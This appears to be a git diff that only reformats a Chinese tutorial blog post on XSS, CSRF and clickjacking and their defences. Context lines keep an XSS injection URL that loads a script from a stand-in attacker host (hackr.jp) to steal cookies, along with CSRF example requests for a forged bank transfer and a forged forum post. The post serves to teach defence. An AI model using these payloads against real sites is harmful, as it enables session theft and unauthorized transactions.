@@ -23,7 +23,7 @@ comments: true
 
 #####         1. 在动态生成的HTML处发生
 
-​        在编辑个人信息的页面处输入<s>Username</s>，此时的确认界面上，浏览器会把用户输入的<s>解析成HTML标签，然后显示出删除线，删除线的显示不会造成太大的不利影响，但如果换成使用<script>标签将会带来不可估量的影响。
+​        在编辑个人信息的页面处输入`<s>Username</s>`，此时的确认界面上，浏览器会把用户输入的`<s>`解析成HTML标签，然后显示出删除线，删除线的显示不会造成太大的不利影响，但如果换成使用`<script>`标签将会带来不可估量的影响。
 
 #####         2. 利用预先设置的陷阱触发的被动攻击
 
@@ -51,7 +51,7 @@ document.write(">");
 
 ​        在存在可跨站脚本攻击安全漏洞的Web应用上执行上面这段Javascript程序，即可访问到该Web应用所处域名下的Cookie信息。然后这些信息就会发送至攻击者的Web网站，记录在他的登陆日志中。这样，攻击者就可以窃取到用户的Cookie信息了。
 
-```javascript
+```html
 http://example.jp/login?ID="><script src='http://hackr.jp/xss.js'></script>"
 ```
 
@@ -59,7 +59,7 @@ http://example.jp/login?ID="><script src='http://hackr.jp/xss.js'></script>"
 
 - 设置Cookie的HttpOnly属性，它使javascript脚本无法获得Cookie
 
-```http
+``` makefile
 Set-Cookie: name=value; HttpOnly
 ```
 
@@ -67,13 +67,13 @@ Set-Cookie: name=value; HttpOnly
 
 - 首部字段X-XSS-Protection
 
-```http
+``` makefile
 X-XSS-Protection: 1
 ```
 
 ​        该首部字段是HTTP响应首部，它是针对跨站脚本攻击的一种对策，用于控制浏览器XSS的防护机制的开关。0：将XSS过滤设置成无效状态。1：将XSS过滤设置成有效状态。 
 
-- 过滤或移除特殊的HTML标签，如<script><iframe>，<、>、"等用实体&lt、&gt、&quot替代。
+- 过滤或移除特殊的HTML标签，如`<script>` ,`<iframe>`，`<`、`>`、`"`等用实体&lt、&gt、&quot替代。
 - 对页面提交的内容进行HTML Encode转义处理
 
 ​       用户提交的数据进行HTML编码，将相应的符号转换为实体名称再进行下一步处理。
@@ -99,17 +99,17 @@ X-XSS-Protection: 1
 
 #####          1. 银行转账
 
-​        受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 http://bank.example/withdraw?account=bob&amount=1000000&for=bob2 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。
+​        受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 <http://bank.example/withdraw?account=bob&amount=1000000&for=bob2> 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。
 
-​        黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory。但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。
+​        黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：<http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory>。但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。
 
-​        这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： src=”http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory ”，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 
+​        这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： src="<http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory>" ，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 
 
 #####         2. 留言板功能
 
 ​        在留言板系统上 ，受害者用户A是已认证状态，在他的浏览器中的Cookie持有已认证的会话ID
 
-```http
+``` makefile
 GET/HTTP/1.1
 Host: example.com
 Cookie: sid=1234567890
@@ -117,13 +117,13 @@ Cookie: sid=1234567890
 
 ​        攻击者在留言板上发表含有恶意代码的评论
 
-```http
+``` html
 <img src="http://example.com/msg?q=你好">
 ```
 
 ​        设置好后一旦用户访问，即会发送在留言板上发表非主观行为产生的评论的请求的陷阱。用户A的浏览器在完成陷阱中的请求后，留言板上也就会留下那条评论。用户A的浏览器中的Cookie持有已认证的会话ID，利用用户A的权限执行发表动作。
 
-```http
+``` makefile
 GET/msg?q=你好 HTTP/1.1
 Host: example.com
 Cookie: sid=1234567890
@@ -133,7 +133,7 @@ Cookie: sid=1234567890
 
 - **验证HTTP Referer字段**
 
-​        首部字段Referer会告知服务器请求的原始资源的URI。通常，访问一个安全受限页面的请求来自于同一网站，比如访问http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory，用户必须首先登陆bank.example域名开头的地址。然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。
+​        首部字段Referer会告知服务器请求的原始资源的URI。通常，访问一个安全受限页面的请求来自于同一网站，比如访问<http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory>，用户必须首先登陆bank.example域名开头的地址。然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。
 
 ​        这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。
 
@@ -145,7 +145,7 @@ Cookie: sid=1234567890
 
 ​         CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。
 
-​        这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 http://url?csrftoken=tokenvalue。 而对于 POST 请求来说，要在 form 的最后加上 <input type=”hidden” name=”csrftoken” value=”tokenvalue”/>，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，**通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token**。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。
+​        这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 <http://url?csrftoken=tokenvalue>。 而对于 POST 请求来说，要在 form 的最后加上 `<input type="hidden" name="csrftoken" value="tokenvalue"/>`，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，**通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token**。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。
 
 ​         该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，**即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。**
 
@@ -227,7 +227,7 @@ Cookie: sid=1234567890
 
 - 通过写一段javascript代码来禁止iframe的嵌套，这种方法叫做frame busting。
 
-```javascript
+``` javascript
 if ( top.location != location ) {
     top.location = self.location;
 }
@@ -277,4 +277,4 @@ parent.location = self.location;
 
 ### 参考：
 
-https://blog.csdn.net/stpeace/article/details/53512283
+<https://blog.csdn.net/stpeace/article/details/53512283> 
